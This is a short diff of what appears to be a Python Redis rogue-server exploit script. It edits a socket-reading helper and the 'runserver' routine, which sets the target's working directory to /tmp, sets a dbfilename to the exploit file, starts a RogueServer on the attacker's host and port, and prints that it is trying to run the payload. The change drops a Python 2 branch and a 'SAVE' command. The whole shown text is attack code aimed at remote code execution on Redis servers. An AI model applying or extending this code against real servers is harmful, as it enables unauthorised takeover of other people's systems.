@@ -36,8 +36,6 @@ def mk_cmd(raw_cmd):
 def din(sock, cnt):
     msg = sock.recv(cnt)
     if verbose:
-        if sys.version_info < (3, 0):
-            msg = repr(msg)
         if len(msg) < 300:
             print("\033[1;34;40m[->]\033[0m {}".format(msg))
         else:
@@ -159,7 +157,6 @@ def runserver(rhost, rport, lhost, lport):
     print("[*] Setting filename")
     remote.do("CONFIG SET dir /tmp/")
     remote.do("CONFIG SET dbfilename {}".format(expfile))
-    remote.do("SAVE")
     sleep(2)
     rogue = RogueServer(lhost, lport)
     print("[*] Tring to run payload")
